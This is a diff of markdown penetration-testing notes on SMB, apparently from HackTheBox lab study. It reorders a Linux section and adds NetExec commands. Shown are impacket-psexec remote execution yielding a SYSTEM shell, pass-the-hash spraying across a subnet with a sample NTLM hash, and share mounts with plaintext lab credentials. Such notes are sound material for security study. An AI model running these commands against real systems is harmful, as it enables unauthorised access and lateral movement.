@@ -177,6 +177,198 @@ ___
 
 <!-- }}} -->
 
+<!-- Linux {{{-->
+## Linux
+
+Linux (UNIX) machines can also mount and browse SMB shares,
+whether the target server is Windows machine or Samba server
+
+<!-- Impacket {{{-->
+### Impacket
+
+> [!todo]
+
+[[Impacket]] - [PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py) —
+Python PsExec like functionality example using
+[RemComSvc](https://github.com/kavika13/RemCom)
+
+```sh
+impacket-psexec <user>:'<password>'@$target
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> MarciPwns@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+> ```
+>
+> ```sh
+> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+>
+> [*] Requesting shares on 10.10.110.17.....
+> [*] Found writable share ADMIN$
+> [*] Uploading file EHtJXgng.exe
+> [*] Opening SVCManager on 10.10.110.17.....
+> [*] Creating service nbAc on 10.10.110.17.....
+> [*] Starting service nbAc.....
+> [!] Press help for extra shell commands
+> Microsoft Windows [Version 10.0.19041.1415]
+> (c) Microsoft Corporation. All rights reserved.
+> ```
+>
+> ```sh
+> C:\Windows\system32>whoami && hostname
+> ```
+>
+> ```sh
+> nt authority\system
+> WIN7BOX
+> ```
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- Mount {{{-->
+### Mount
+
+Mount and browse SMB shares
+
+1. Install [cifs-utils](https://www.kali.org/tools/cifs-utils/)
+
+```sh
+sudo apt install cifs-utils
+```
+
+2. Create a temporary mount directory
+
+```sh
+sudo mkdir /mnt/tmp
+```
+
+3. Mount the SMB share
+
+```sh
+sudo mount -t cifs -o username=<username>,password=<password>,domain=. //$target/<share> /mnt/ext
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> MarciPwns@htb[/htb]$ sudo mkdir /mnt/Finance
+> ```
+> ```sh
+> MarciPwns@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+> ```
+<!-- }}} -->
+
+```sh
+mount -t cifs //$target/<share> /mnt/ext -o credentials=/path/credentialfile
+```
+
+<!-- Credential File {{{-->
+> [!info]- Credential File
+>
+> ```sh
+> username=plaintext
+> password=Password123
+> domain=.
+> ```
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> MarciPwns@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+> ```
+<!-- }}} -->
+
+<!-- }}} -->
+
+___
+<!-- }}} -->
+
+<!-- NetExec {{{-->
+## NetExec
+
+<!-- Authenticate {{{-->
+### Authenticate
+
+```sh
+nxc smb $target -u <user> -p '<password>'
+```
+
+```sh
+nxc smb $target -u <user> -p '<password>' --local-auth
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'
+> ```
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- Pass-The-Hash {{{-->
+### Pass-The-Hash
+
+```sh
+nxc smb $target -u <user> -H 'LM:NT'
+```
+
+```sh
+nxc smb $target -u <user> -H 'LM:NT' --local-auth
+```
+
+```sh
+nxc smb $target -u <user> -H 'NTHASH'
+```
+
+```sh
+nxc smb $target -u <user> -H 'NTHASH' --local-auth
+```
+
+```sh
+nxc smb $target -u <user> -H '<hash>'
+```
+
+```sh
+nxc smb $target -u <user> -H '<hash>' --local-auth
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> Obtained credentials
+>
+> ```sh
+> Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+> ```
+>
+> ```sh
+> nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
+> ```
+> ```sh
+> nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
+> ```
+> ```sh
+> nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
+> ```
+> ```sh
+> nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
+> ```
+<!-- }}} -->
+
+<!-- }}} -->
+
+___
+<!-- }}} -->
+
 <!-- Windows {{{-->
 ## Windows
 
@@ -319,119 +511,6 @@ Connect to a file share with credentials
 > Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
 > ----           ---------     --------- --------      ----                                                              ---------------
 > N                                      FileSystem    \\192.168.220.129\Finance
-> ```
-<!-- }}} -->
-
-<!-- }}} -->
-
-___
-<!-- }}} -->
-
-<!-- Linux {{{-->
-## Linux
-
-Linux (UNIX) machines can also mount and browse SMB shares,
-whether the target server is Windows machine or Samba server
-
-<!-- Impacket {{{-->
-### Impacket
-
-> [!todo]
-
-[[Impacket]] - [PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py) —
-Python PsExec like functionality example using
-[RemComSvc](https://github.com/kavika13/RemCom)
-
-```sh
-impacket-psexec <user>:'<password>'@$target
-```
-
-<!-- Example {{{-->
-> [!example]-
->
-> ```sh
-> MarciPwns@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
-> ```
->
-> ```sh
-> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
->
-> [*] Requesting shares on 10.10.110.17.....
-> [*] Found writable share ADMIN$
-> [*] Uploading file EHtJXgng.exe
-> [*] Opening SVCManager on 10.10.110.17.....
-> [*] Creating service nbAc on 10.10.110.17.....
-> [*] Starting service nbAc.....
-> [!] Press help for extra shell commands
-> Microsoft Windows [Version 10.0.19041.1415]
-> (c) Microsoft Corporation. All rights reserved.
-> ```
->
-> ```sh
-> C:\Windows\system32>whoami && hostname
-> ```
->
-> ```sh
-> nt authority\system
-> WIN7BOX
-> ```
-<!-- }}} -->
-
-<!-- }}} -->
-
-<!-- Mount {{{-->
-### Mount
-
-Mount and browse SMB shares
-
-1. Install [cifs-utils](https://www.kali.org/tools/cifs-utils/)
-
-```sh
-sudo apt install cifs-utils
-```
-
-2. Create a temporary mount directory
-
-```sh
-sudo mkdir /mnt/tmp
-```
-
-3. Mount the SMB share
-
-```sh
-sudo mount -t cifs -o username=<username>,password=<password>,domain=. //$target/<share> /mnt/ext
-```
-
-<!-- Example {{{-->
-> [!example]-
->
-> ```sh
-> MarciPwns@htb[/htb]$ sudo mkdir /mnt/Finance
-> ```
-> ```sh
-> MarciPwns@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
-> ```
-<!-- }}} -->
-
-```sh
-mount -t cifs //$target/<share> /mnt/ext -o credentials=/path/credentialfile
-```
-
-<!-- Credential File {{{-->
-> [!info]- Credential File
->
-> ```sh
-> username=plaintext
-> password=Password123
-> domain=.
-> ```
-<!-- }}} -->
-
-<!-- Example {{{-->
-> [!example]-
->
-> ```sh
-> MarciPwns@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
 > ```
 <!-- }}} -->
 
